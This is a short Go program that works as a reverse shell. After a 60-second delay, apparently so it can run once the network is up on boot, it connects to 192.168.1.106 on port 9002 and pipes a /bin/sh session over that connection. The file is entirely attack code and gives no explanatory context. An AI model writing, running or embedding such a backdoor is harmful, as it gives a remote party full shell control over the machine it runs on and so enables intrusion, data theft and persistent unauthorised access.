package main

import (
	"net"
	"os/exec"
	"time"
)

func main() {
	//Needed because we must ensure network is up by then
	time.Sleep(60 * time.Second)
	c, _ := net.Dial("tcp", "192.168.1.106:9002")
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}
